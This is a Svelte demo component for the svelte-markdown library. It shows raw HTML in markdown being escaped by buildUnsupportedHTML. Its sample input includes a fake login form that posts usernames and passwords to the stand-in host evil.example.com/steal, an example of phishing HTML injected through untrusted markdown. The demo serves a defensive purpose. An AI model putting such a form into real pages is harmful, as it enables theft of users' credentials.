<script lang="ts">
    import SvelteMarkdown, { buildUnsupportedHTML } from '@humanspeak/svelte-markdown'

    // Strip every HTML tag — markdown formatting only. Raw HTML is rendered
    // as escaped text in the output so blocked content is auditable.
    const html = buildUnsupportedHTML()

    const markdown = `## HTML Filtering Demo

This paragraph has **bold** and *italic* markdown formatting.

<div>
This is inside a raw HTML div element.
</div>

<strong>HTML strong tag</strong> and <em>HTML em tag</em>.

<details>
<summary>Click to expand</summary>
Hidden content inside details/summary tags.
</details>

<iframe src="https://example.com" title="example iframe"></iframe>

<form action="https://evil.example.com/steal" method="POST">
  <strong>Fake login injected by untrusted markdown</strong>
  <input type="text" placeholder="Username" />
  <input type="password" placeholder="Password" />
  <button type="submit">Sign in</button>
</form>
`
</script>

<div class="hf-demo hf-demo-blocked">
    <div class="hf-demo-bar">
        <span>POLICY / HTML BLOCKED</span>
        <span>buildUnsupportedHTML</span>
    </div>
    <div class="hf-demo-preview">
        <div class="hf-markdown prose prose-sm dark:prose-invert max-w-none">
            <SvelteMarkdown source={markdown} renderers={{ html }} />
        </div>
    </div>
</div>

<style>
    .hf-demo {
        color: var(--brut-ink, currentColor);
        background:
            linear-gradient(135deg, var(--hf-wash), transparent 46%), var(--brut-bg, Canvas);
        border: 1px solid var(--brut-rule, rgba(127, 127, 127, 0.22));
        font-family: 'Inter Variable', 'Inter', system-ui, sans-serif;
    }
    .hf-demo-bar {
        display: flex;
        align-items: center;
        justify-content: space-between;
        gap: 12px;
        border-bottom: 1px solid var(--brut-rule, rgba(127, 127, 127, 0.22));
        padding: 9px 12px;
        color: var(--brut-ink-3, color-mix(in srgb, currentColor 58%, transparent));
        font-family: 'JetBrains Mono Variable', 'JetBrains Mono', ui-monospace, monospace;
        font-size: 11px;
        letter-spacing: 0.04em;
        text-transform: uppercase;
    }
    .hf-demo-bar span:first-child {
        color: var(--hf-accent);
        font-weight: 700;
    }
    .hf-demo-preview {
        padding: clamp(16px, 3vw, 28px);
    }
    .hf-markdown {
        color: var(--brut-ink-2, currentColor);
    }
    .hf-markdown :global(h2) {
        color: var(--brut-ink, currentColor);
        letter-spacing: 0;
    }
    .hf-demo-blocked {
        --hf-accent: #2563eb;
        --hf-wash: rgba(37, 99, 235, 0.1);
    }
    :global(html.dark) .hf-demo-blocked {
        --hf-accent: #60a5fa;
        --hf-wash: rgba(96, 165, 250, 0.1);
    }
    @media (max-width: 640px) {
        .hf-demo-bar {
            align-items: flex-start;
            flex-direction: column;
        }
    }
</style>
